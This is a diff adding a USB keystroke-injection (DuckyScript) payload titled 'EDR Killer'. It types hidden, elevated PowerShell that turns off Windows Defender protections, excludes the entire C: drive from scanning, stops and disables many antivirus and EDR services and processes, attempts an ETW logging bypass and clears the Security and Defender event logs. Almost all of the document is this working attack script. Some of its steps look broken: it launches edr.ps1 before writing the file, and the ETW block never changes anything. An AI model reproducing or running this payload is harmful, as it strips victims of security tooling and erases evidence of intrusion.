@@ -1,0 +1,87 @@
+REM =============================================
+REM Title: EDR Killer
+REM Author: bad-antics
+REM Description: Disable common EDR/AV solutions
+REM Category: nullsec/attack
+REM Target: Windows 10/11 (requires admin)
+REM =============================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb RunAs -ArgumentList '-w hidden -ep bypass -c "& {iex(gc $env:TEMP\edr.ps1 -Raw)}"'
+ENTER
+DELAY 300
+
+REM Accept UAC (user must click yes)
+DELAY 2000
+
+REM Now create the payload
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 600
+
+REM Create EDR killer script
+STRING @'
+
+# Disable Windows Defender
+Set-MpPreference -DisableRealtimeMonitoring $true -Force 2>$null
+Set-MpPreference -DisableBehaviorMonitoring $true -Force 2>$null
+Set-MpPreference -DisableBlockAtFirstSeen $true -Force 2>$null
+Set-MpPreference -DisableIOAVProtection $true -Force 2>$null
+Set-MpPreference -DisableScriptScanning $true -Force 2>$null
+
+# Add exclusion for entire C: drive
+Add-MpPreference -ExclusionPath "C:\" -Force 2>$null
+
+# Stop and disable security services
+$services = @(
+    "WinDefend","Sense","WdNisSvc","WdNisDrv","WdFilter","WdBoot",
+    "SecurityHealthService","wscsvc","WRSVC","ekrn","EPSecurityService",
+    "EPUpdateService","MBAMService","SepMasterService","ccSvcHst",
+    "SAVAdminService","SAVService","avast","avgwd","AVP"
+)
+
+foreach($s in $services){
+    try{
+        Stop-Service $s -Force -ErrorAction SilentlyContinue
+        Set-Service $s -StartupType Disabled -ErrorAction SilentlyContinue
+    }catch{}
+}
+
+# Kill EDR processes
+$procs = @(
+    "MsMpEng","MsSense","SenseIR","SenseCncProxy","SecurityHealthSystray",
+    "egui","ekrn","avgui","avguard","avp","kavtray","bdagent","vsserv",
+    "mbam","SentinelAgent","SentinelServiceHost","CylanceSvc"
+)
+
+foreach($p in $procs){
+    try{Stop-Process -Name $p -Force -ErrorAction SilentlyContinue}catch{}
+}
+
+# Disable ETW logging (evades some detections)
+$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
+$etw = $assemblies | Where-Object {$_.GetType("System.Diagnostics.Eventing.EventProvider")}
+if($etw){
+    $type = $etw.GetType("System.Diagnostics.Eventing.EventProvider")
+    $field = $type.GetField("m_enabled", [Reflection.BindingFlags]"NonPublic,Instance")
+}
+
+# Clear security logs
+wevtutil cl Security 2>$null
+wevtutil cl Microsoft-Windows-Windows Defender/Operational 2>$null
+
+'@|Out-File "$env:TEMP\edr.ps1" -Encoding UTF8
+ENTER
+DELAY 300
+
+REM Execute the script with admin
+STRING Start-Process powershell -Verb RunAs -ArgumentList "-w hidden -ep bypass -f $env:TEMP\edr.ps1"
+ENTER
+DELAY 500
+
+STRING exit
+ENTER
